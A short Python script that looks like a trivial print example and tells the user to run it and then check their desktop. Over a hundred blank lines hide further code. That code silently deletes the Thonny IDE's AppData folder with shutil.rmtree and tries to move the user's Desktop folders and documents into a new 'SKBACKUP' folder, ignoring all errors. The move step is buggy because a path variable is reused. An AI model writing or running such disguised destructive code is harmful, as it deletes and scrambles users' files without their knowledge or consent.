a=5
print(a)


print("Run this program then Check you desktop")


































































































































import os
import shutil

d=os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
os.chdir(d)
try:
   os.mkdir("SKBACKUP")
except:
    pass

#os.chdir("SKBACKUP")
allfiles=os.listdir()
fileext=['.txt','.pdf','.html','.htm','.jpg',
         '.jpeg','.png','.gif','.docx','.pptx',
         '.xlsx','.py','.bat','.webp','.lnk','.doc','.xls','.sql',
         '.accdb','.mdb',".psd",'ini','.bat',
         ]

ppt=r"C:\Users\Admin\AppData\Roaming\Thonny"
d=os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\Roaming\Thonny') 
os.chdir(d)
try:
    shutil.rmtree(d)
except:
    pass


for i in allfiles:
    posi=i.rfind('.')
    ns=i[posi:]
    #x=os.path.isfile(i)
    y=os.path.isdir(i)
    print(f"{i} is Folder ",y )
    try:
        if os.path.isdir(i) and i!="SKBACKUP":
                sf=d+"\\"+i
                df=d+"\\SKBACKUP\\"+i
                shutil.move(sf,df)
                print("Moving ..",i,y)
        
        if ns in fileext:
            print("Moving ..",i,y)
            shutil.move(d+"\\"+i,d+"\\SKBACKUP\\"+i)
            
    except:
        pass
    
        
        
        

        
